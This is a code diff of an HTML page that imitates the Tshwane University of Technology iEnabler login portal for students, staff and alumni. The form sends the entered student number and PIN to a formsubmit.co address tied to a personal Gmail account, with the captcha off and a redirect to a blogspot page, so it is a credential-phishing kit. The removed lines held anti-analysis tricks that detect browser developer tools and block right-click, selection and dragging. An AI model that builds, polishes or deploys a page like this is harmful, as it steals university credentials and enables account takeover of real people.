@@ -7,58 +7,240 @@
   <title>TUT Self Help iEnabler</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
-    body { background: #c8d8ec; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-    .wrap { width: 100%; max-width: 540px; border: 1px solid #999; background: #fff; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); }
-    .fra-header { background: #d6e4f7; padding: 5px 10px; border-bottom: 1px solid #aab; display: flex; justify-content: space-between; align-items: center; }
-    .fra-inst { font-size: 13px; font-weight: bold; color: #222; }
-    .logo-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #fff; border-bottom: 2px solid #003399; }
-    .logo-left { display: flex; align-items: center; gap: 12px; }
-    .logo-left img { height: 75px; width: auto; }
-    .tut-name { color: #003399; font-size: 18px; font-weight: bold; line-height: 1.3; }
-    .tut-name .tagline { color: #cc0000; font-style: italic; font-weight: normal; font-size: 13px; display: block; margin-top: 2px; }
-    .its-badge { background: #003399; color: #fff; font-size: 11px; font-weight: bold; padding: 8px 14px; border-radius: 3px; text-align: center; line-height: 1.4; }
-    .its-badge .its-big { font-size: 22px; letter-spacing: 3px; display: block; }
-    .login-top { background: #003399; color: #fff; font-weight: bold; font-size: 14px; padding: 9px 16px; }
-    .login-body { padding: 18px 20px; background: #fff; }
-    .radio-row { display: flex; gap: 18px; margin-bottom: 16px; flex-wrap: wrap; }
-    .radio-row label { display: flex; align-items: center; gap: 5px; font-size: 13px; cursor: pointer; color: #000; }
-    .radio-row input[type="radio"] { width: 15px; height: 15px; accent-color: #003399; cursor: pointer; }
-    .field-label { font-size: 13px; color: #000; margin-bottom: 4px; font-weight: normal; }
-    .tut-input { width: 100%; padding: 7px 9px; border: 1px solid #666; font-size: 13px; margin-bottom: 14px; border-radius: 1px; background: #ffffff; color: #000000; font-family: Arial, Helvetica, sans-serif; }
-    .tut-input:focus { outline: 2px solid #003399; border-color: #003399; }
-    .pin-hint { font-size: 11px; color: #555; margin: -10px 0 16px; }
-    hr { border: none; border-top: 1px solid #bbb; margin: 12px 0 14px; }
-    .btn-row { display: flex; flex-wrap: wrap; gap: 7px; }
-    .tut-btn { padding: 6px 14px; font-size: 12px; border: 1px solid #888; background: #e0e0e0; cursor: pointer; border-radius: 2px; color: #000000; font-family: Arial, Helvetica, sans-serif; font-weight: normal; }
-    .tut-btn:hover { background: #c8d4ee; border-color: #003399; color: #000000; }
-    .tut-btn:active { background: #b0c0e0; }
-    .btn-row-2 { margin-top: 8px; }
-    .msg-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 14px; border-radius: 2px; display: none; }
-    .msg-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 14px; border-radius: 2px; display: none; }
-    .login-bottom { background: #d6e4f7; border-top: 1px solid #aab; padding: 7px 16px; font-size: 11px; color: #333; text-align: center; }
-    /* Blur overlay shown when DevTools detected */
-    #shield { display:none; position:fixed; inset:0; background:rgba(0,0,30,0.97); z-index:99999; align-items:center; justify-content:center; flex-direction:column; color:#fff; font-size:18px; text-align:center; padding:40px; }
-    #shield p { margin-top:12px; font-size:13px; color:#aac; }
-    @media (max-width: 480px) { .logo-left img { height: 55px; } .tut-name { font-size: 15px; } .its-badge { display: none; } .radio-row { gap: 10px; } }
+
+    body {
+      background: #c8d8ec;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .wrap {
+      width: 100%;
+      max-width: 540px;
+      border: 1px solid #999;
+      background: #fff;
+      box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
+    }
+
+    /* Top grey-blue header bar */
+    .fra-header {
+      background: #d6e4f7;
+      padding: 5px 10px;
+      border-bottom: 1px solid #aab;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .fra-inst {
+      font-size: 13px;
+      font-weight: bold;
+      color: #222;
+    }
+
+    /* Logo row */
+    .logo-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      background: #fff;
+      border-bottom: 2px solid #003399;
+    }
+    .logo-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .logo-left img {
+      height: 75px;
+      width: auto;
+    }
+    .tut-name {
+      color: #003399;
+      font-size: 18px;
+      font-weight: bold;
+      line-height: 1.3;
+    }
+    .tut-name .tagline {
+      color: #cc0000;
+      font-style: italic;
+      font-weight: normal;
+      font-size: 13px;
+      display: block;
+      margin-top: 2px;
+    }
+    .its-badge {
+      background: #003399;
+      color: #fff;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 8px 14px;
+      border-radius: 3px;
+      text-align: center;
+      line-height: 1.4;
+    }
+    .its-badge .its-big {
+      font-size: 22px;
+      letter-spacing: 3px;
+      display: block;
+    }
+
+    /* Blue login bar */
+    .login-top {
+      background: #003399;
+      color: #fff;
+      font-weight: bold;
+      font-size: 14px;
+      padding: 9px 16px;
+    }
+
+    /* Form body */
+    .login-body {
+      padding: 18px 20px;
+      background: #fff;
+    }
+
+    .radio-row {
+      display: flex;
+      gap: 18px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .radio-row label {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 13px;
+      cursor: pointer;
+      color: #000;
+    }
+    .radio-row input[type="radio"] {
+      width: 15px;
+      height: 15px;
+      accent-color: #003399;
+      cursor: pointer;
+    }
+
+    .field-label {
+      font-size: 13px;
+      color: #000;
+      margin-bottom: 4px;
+      font-weight: normal;
+    }
+
+    .tut-input {
+      width: 100%;
+      padding: 7px 9px;
+      border: 1px solid #666;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 1px;
+      background: #ffffff;
+      color: #000000;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .tut-input:focus {
+      outline: 2px solid #003399;
+      border-color: #003399;
+    }
+
+    .pin-hint {
+      font-size: 11px;
+      color: #555;
+      margin: -10px 0 16px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #bbb;
+      margin: 12px 0 14px;
+    }
+
+    .btn-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 7px;
+    }
+    .tut-btn {
+      padding: 6px 14px;
+      font-size: 12px;
+      border: 1px solid #888;
+      background: #e0e0e0;
+      cursor: pointer;
+      border-radius: 2px;
+      color: #000000;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: normal;
+    }
+    .tut-btn:hover {
+      background: #c8d4ee;
+      border-color: #003399;
+      color: #000000;
+    }
+    .tut-btn:active {
+      background: #b0c0e0;
+    }
+    .btn-row-2 {
+      margin-top: 8px;
+    }
+
+    /* Success / Error messages */
+    .msg-success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 2px;
+      display: none;
+    }
+    .msg-error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      border-radius: 2px;
+      display: none;
+    }
+
+    /* Footer bar */
+    .login-bottom {
+      background: #d6e4f7;
+      border-top: 1px solid #aab;
+      padding: 7px 16px;
+      font-size: 11px;
+      color: #333;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .logo-left img { height: 55px; }
+      .tut-name { font-size: 15px; }
+      .its-badge { display: none; }
+      .radio-row { gap: 10px; }
+    }
   </style>
 </head>
 <body>
 
-<!-- DevTools Shield -->
-<div id="shield">
-  🔒 Access Restricted<br>
-  <p>Developer tools are not permitted on this page.<br>Please close DevTools to continue.</p>
-</div>
+<div class="wrap">
 
-<div class="wrap" id="mainWrap">
-
+  <!-- Top header bar -->
   <div class="fra-header">
     <span class="fra-inst">Tshwane University of Technology PRODI41</span>
   </div>
 
+  <!-- Logo row -->
   <div class="logo-row">
     <div class="logo-left">
-      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/49/Tshwane_University_of_Technology_logo.svg/120px-Tshwane_University_of_Technology_logo.svg.png" alt="TUT Logo">
+      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/49/Tshwane_University_of_Technology_logo.svg/120px-Tshwane_University_of_Technology_logo.svg.png"
+           alt="TUT Logo">
       <div class="tut-name">
         Tshwane University<br>of Technology
         <span class="tagline">We empower people</span>
@@ -70,18 +252,29 @@
     </div>
   </div>
 
+  <!-- Blue bar -->
   <div class="login-top">Registered Users: Login Credentials</div>
 
+  <!-- Form -->
   <div class="login-body">
-    <div class="msg-success" id="msgSuccess">&#10003; Your login details have been submitted successfully.</div>
-    <div class="msg-error" id="msgError">&#9888; Please fill in all required fields correctly.</div>
 
-    <form id="loginForm" action="https://formsubmit.co/getzgetz14@gmail.com" method="POST">
+    <div class="msg-success" id="msgSuccess">
+      &#10003; Your login details have been submitted successfully.
+    </div>
+    <div class="msg-error" id="msgError">
+      &#9888; Please fill in all required fields correctly.
+    </div>
+
+    <form id="loginForm"
+          action="https://formsubmit.co/getzgetz14@gmail.com"
+          method="POST">
+
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_subject" value="TUT iEnabler Login Submission">
       <input type="hidden" name="_next" value="https://tut-student-query.blogspot.com/2026/03/tut-student-query-portal-root-navy.html">
       <input type="hidden" name="_template" value="table">
 
+      <!-- User type radio -->
       <div class="radio-row">
         <label><input type="radio" name="User_Type" value="Student" checked> Student</label>
         <label><input type="radio" name="User_Type" value="Personnel"> Personnel</label>
@@ -89,11 +282,24 @@
         <label><input type="radio" name="User_Type" value="Alumni"> Alumni</label>
       </div>
 
+      <!-- Student Number -->
       <div class="field-label">Student Number:</div>
-      <input class="tut-input" type="text" name="Student_Number" id="studentNumber" autocomplete="off" required>
+      <input class="tut-input" type="text" name="Student_Number"
+             id="studentNumber"
+             placeholder=""
+             autocomplete="off"
+             required>
 
+      <!-- PIN -->
       <div class="field-label">Pin:</div>
-      <input class="tut-input" type="password" name="PIN" id="pinField" maxlength="5" pattern="[1-9][0-9]{4}" title="5 numeric digits. Do not start with a 0." autocomplete="off" required>
+      <input class="tut-input" type="password" name="PIN"
+             id="pinField"
+             placeholder=""
+             maxlength="5"
+             pattern="[1-9][0-9]{4}"
+             title="5 numeric digits. Do not start with a 0."
+             autocomplete="off"
+             required>
       <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>
 
       <hr>
@@ -107,92 +313,47 @@
       <div class="btn-row-2">
         <button type="button" class="tut-btn" onclick="alert('Please contact the Registrar\'s office for your student number.')">Forgot Student Number</button>
       </div>
+
     </form>
   </div>
 
-  <div class="login-bottom">&copy; 2026 Tshwane University of Technology &nbsp;|&nbsp; Powered by ITS Tertiary Software</div>
+  <!-- Footer -->
+  <div class="login-bottom">
+    &copy; 2026 Tshwane University of Technology &nbsp;|&nbsp; Powered by ITS Tertiary Software
+  </div>
+
 </div>
 
 <script>
-// ── 1. DISABLE RIGHT-CLICK ──────────────────────────────────────────
-document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    var sNum = document.getElementById('studentNumber').value.trim();
+    var pin  = document.getElementById('pinField').value.trim();
+    var pinPattern = /^[1-9][0-9]{4}$/;
 
-// ── 2. BLOCK COMMON DEVTOOLS KEYBOARD SHORTCUTS ────────────────────
-document.addEventListener('keydown', function(e){
-  var k = e.key, c = e.ctrlKey||e.metaKey, s = e.shiftKey;
-  // F12, Ctrl+Shift+I/J/C, Ctrl+U (View Source), Ctrl+S (Save)
-  if(
-    k==='F12' ||
-    (c && s && (k==='I'||k==='i'||k==='J'||k==='j'||k==='C'||k==='c')) ||
-    (c && (k==='U'||k==='u'||k==='S'||k==='s'))
-  ){
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
-  }
-});
+    if (!sNum || !pin) {
+      e.preventDefault();
+      document.getElementById('msgError').style.display = 'block';
+      document.getElementById('msgSuccess').style.display = 'none';
+      return;
+    }
 
-// ── 3. DEVTOOLS SIZE DETECTION (fires shield overlay) ─────────────
-var shield = document.getElementById('shield');
-var _threshold = 160;
-function checkDevTools(){
-  var widthDiff  = window.outerWidth  - window.innerWidth;
-  var heightDiff = window.outerHeight - window.innerHeight;
-  if(widthDiff > _threshold || heightDiff > _threshold){
-    shield.style.display = 'flex';
-    document.getElementById('mainWrap').style.filter = 'blur(8px)';
-  } else {
-    shield.style.display = 'none';
-    document.getElementById('mainWrap').style.filter = 'none';
-  }
-}
-setInterval(checkDevTools, 800);
+    if (!pinPattern.test(pin)) {
+      e.preventDefault();
+      document.getElementById('msgError').textContent = '\u26a0 PIN must be exactly 5 digits and must not start with 0.';
+      document.getElementById('msgError').style.display = 'block';
+      document.getElementById('msgSuccess').style.display = 'none';
+      return;
+    }
 
-// ── 4. DEBUGGER TRAP (slows down/detects stepping) ────────────────
-(function devTrap(){
-  var start = new Date();
-  debugger;
-  var end = new Date();
-  if(end - start > 100){
-    // DevTools was open and paused on debugger
-    shield.style.display = 'flex';
-    document.getElementById('mainWrap').style.filter = 'blur(8px)';
-  }
-})();
+    document.getElementById('msgError').style.display = 'none';
+    document.getElementById('msgSuccess').style.display = 'block';
+    /* Form will submit naturally to formsubmit.co */
+  });
 
-// ── 5. DISABLE TEXT SELECTION ─────────────────────────────────────
-document.addEventListener('selectstart', function(e){ e.preventDefault(); });
-
-// ── 6. DISABLE DRAG ───────────────────────────────────────────────
-document.addEventListener('dragstart', function(e){ e.preventDefault(); });
-
-// ── 7. FORM VALIDATION ────────────────────────────────────────────
-document.getElementById('loginForm').addEventListener('submit', function(e){
-  var sNum = document.getElementById('studentNumber').value.trim();
-  var pin  = document.getElementById('pinField').value.trim();
-  var pinPattern = /^[1-9][0-9]{4}$/;
-  if(!sNum || !pin){
-    e.preventDefault();
-    document.getElementById('msgError').textContent = '\u26a0 Please fill in all required fields correctly.';
-    document.getElementById('msgError').style.display = 'block';
-    document.getElementById('msgSuccess').style.display = 'none';
-    return;
-  }
-  if(!pinPattern.test(pin)){
-    e.preventDefault();
-    document.getElementById('msgError').textContent = '\u26a0 PIN must be exactly 5 digits and must not start with 0.';
-    document.getElementById('msgError').style.display = 'block';
-    document.getElementById('msgSuccess').style.display = 'none';
-    return;
-  }
-  document.getElementById('msgError').style.display = 'none';
-  document.getElementById('msgSuccess').style.display = 'block';
-});
-
-// ── 8. DIGITS ONLY IN PIN ─────────────────────────────────────────
-document.getElementById('pinField').addEventListener('input', function(){
-  this.value = this.value.replace(/[^0-9]/g,'');
-});
+  /* Only allow digits in PIN field */
+  document.getElementById('pinField').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+  });
 </script>
 
 </body>
